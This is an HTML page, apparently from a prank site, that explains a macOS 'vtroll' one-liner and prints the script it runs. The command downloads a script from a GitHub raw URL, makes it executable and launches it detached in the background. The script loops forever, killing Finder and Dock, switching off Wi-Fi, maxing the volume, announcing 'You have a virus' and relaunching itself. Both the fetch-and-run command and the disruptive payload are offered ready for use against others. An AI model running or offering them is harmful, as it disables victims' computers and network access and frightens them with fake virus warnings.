<html>
  <head>
    <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
    <title>vtroll</title>
    <link href='/style.css' rel='stylesheet' type='text/css'>
  </head>
  <body>
    <div>
      <h1>An in-depth view of vtroll</h1>
      What does the command do? Let's break it down.<br />
      <code>curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl" -o "trolling"; tr -d '\r' < trolling >trollingnl; chmod +x ./trollingnl; rm -rf trolling; nohup sh -c '$PWD/trollingnl' &</code>
      <h2>curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl" -o "trolling";</h2>
      This is the first part. It downloads the file <a href="https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl">https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl</a> as troll on the filesystem.<br />
      <h2>tr -d '\r' < trolling >trollingnl;</h2>
      While creating the script, occasionally, the line endings would act weird and not allow the script to run. In order to fix this, we strip any possible DOS newlines, to make it unix/linux/mac safe.<br />
      It takes the contents of the downloaded file <i>troll</i> and save the NewLine version into <i>trollnl</i>
      <h2>chmod +x ./trollingnl;</h2>
      This makes the script runnable/executable (setting the eXecutable bit to true).
      <h2>rm -rf trolling;</h2>
      This gets rid of the original <i>trolling</i> file that we no longer need.
      <h2>nohup sh -c '$PWD/trollingnl' &</h2>
      Finally, this launches <i>trollingnl</i> via nohup.<br />
      Nohup allows processes to ignore hangups. Pretty much, this means that the process won't end when you close Terminal.<br />
      A very important thing to note here is the ampersand (&) at the end. This allows nohup to run in the background.<br />
    </div>
    <div>
      <h1>What's in <i>https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/vtroll/dl</i>?</h1>
      <pre><code>
#!/bin/bash
while true; do
#Kill Finder & Dock, to make it harder to launch new applications
killall Finder
killall Dock
#Kill wifi, just for fun
networksetup -setairportpower en1 off
#Make an error sound
osascript -e 'beep'
#Set the volume to max, then say "You have a virus"
osascript -e "set volume 7"
say You have a virus
#Self-replicate.
open -a Terminal.app ~/trollingnl
#Show the You have a virus dialog
osascript -e 'tell app "Finder" to display dialog "You have a virus!"'
done
</code></pre>
      The code's comments should be pretty self-explanatory.
    </div>
  </body>
</html>
